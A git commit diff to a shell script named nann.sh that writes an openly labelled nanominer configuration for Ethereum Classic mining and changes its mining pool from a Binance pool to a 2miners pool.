8b83c7af9a720851dffa9312fffe4dbf65d40ebd
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-01 09:07:02 +0700

    Update nann.sh

--- nann.sh
+++ nann.sh
@@ -18,5 +18,5 @@ wallet = 0x11880b1cfe04907c5306222be1e09f4bbb480eb5
 coin = ETC
 rigName = $worker
 rigPassword = x
-pool1 = stratum+tcp://etc.poolbinance.com:1800" > config.ini
+pool1 = us-etc.2miners.com:1010" > config.ini
 ./nanominer
